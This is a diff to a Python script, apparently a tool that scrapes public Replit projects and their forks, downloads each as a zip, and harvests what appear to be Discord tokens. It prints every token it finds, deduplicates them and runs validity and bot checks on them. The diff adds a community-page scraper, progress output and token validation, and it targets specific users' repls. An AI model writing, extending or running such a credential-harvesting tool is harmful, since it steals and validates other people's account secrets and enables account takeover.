@@ -6,23 +6,27 @@ from aioconsole import aprint
 from colorama import Fore as color
 
 
-
+# Scrapes forks from url passed in main argument
 
 async def main(url: str):
+    repl = ReplIt()
     if os.path.isfile("./false_tokens.txt"):
         os.remove("./false_tokens.txt")
 
     if os.path.isfile("./tokens.txt"):
         os.remove("./tokens.txt")
 
-    repl = ReplIt()
+    if os.path.isfile("./valid.txt"):
+        os.remove("./valid.txt")
+
+
     await Design.ascii()
     await aprint(f"{color.GREEN}Scraping {url}...{color.RESET}")
     id = await repl.get_id(url)
     urls, ids = await repl.get_forks(id)
     await aprint(f"{color.GREEN}Forks found: {len(urls)}{color.RESET}")
     full = []
-
+    count = 0
     for url, id in zip(urls, ids):
         with open("./false_tokens.txt", "a+") as f:
             try:
@@ -31,6 +35,8 @@ async def main(url: str):
                 for token in tokens:
                     f.write(f"{token}\n")
                 full += tokens
+                count += 1
+                await aprint(f"{color.GREEN}Finished fork {count}{color.RESET}")
             except:
                 continue
 
@@ -46,13 +52,82 @@ async def main(url: str):
             lines_seen.add(line)
     outfile.close()
     await repl.check()
+    await repl.bot_check()
 
 
 
+# Scrapes from /community/discord
+# Finds forks too
+
+async def scrape():
+    if os.path.isfile("./false_tokens.txt"):
+        os.remove("./false_tokens.txt")
+
+    if os.path.isfile("./tokens.txt"):
+        os.remove("./tokens.txt")
+
+    if os.path.isfile("./valid.txt"):
+        os.remove("./valid.txt")
+
+    repl = ReplIt()
+    await Design.ascii()
+
+    urls, ids = await repl.repl_scrape()
+
+    await aprint(f"{color.GREEN}Urls found: {len(urls)}{color.RESET}")
+
+    full = []
+    count = 0
+    for url, id in zip(urls, ids):
+
+        with open("./false_tokens.txt", "a+") as f:
+            try:
+                await repl.get_zip(url, id)
+                tokens = await repl.search_zip(id)
+                for token in tokens:
+                    f.write(f"{token}\n")
+                full += tokens
+                count += 1
+                await aprint(f"{color.GREEN}Finished fork {count}{color.RESET}")
+            except:
+                continue
+
+    for id in ids:
+        count = 0
+        urls, new_ids = await repl.get_forks(id)
+        await aprint(f"{color.GREEN}Forks found: {len(urls)}{color.RESET}")
+        for url, id in zip(urls, new_ids):
+            with open("./false_tokens.txt", "a+") as f:
+                try:
+                    await repl.get_zip(url, id)
+                    tokens = await repl.search_zip(id)
+                    for token in tokens:
+                        f.write(f"{token}\n")
+                    full += tokens
+                    count += 1
+                    await aprint(f"{color.GREEN}Finished fork {count}{color.RESET}")
+                except:
+                    continue
+
+
+    for token in full:
+        await aprint(f"{color.GREEN}Found token: {token}{color.RESET}")
+    await aprint(f"{color.YELLOW}Removing duplicates... {color.RESET}")
+    lines_seen = set()
+    outfile = open("tokens.txt", "w")
+    for line in open("false_tokens.txt", "r"):
+        if line not in lines_seen:
+            outfile.write(line)
+            lines_seen.add(line)
+    outfile.close()
+    await repl.check()
+    # Bot check
+    await repl.bot_check()
 
 
 
 
 
 if __name__ == "__main__":
-    asyncio.run(main("/@Ace1028/discord-selfbot"))
+    asyncio.run(main("/@FishballNooodle/Discord-Bot"))
+    # asyncio.run(scrape())
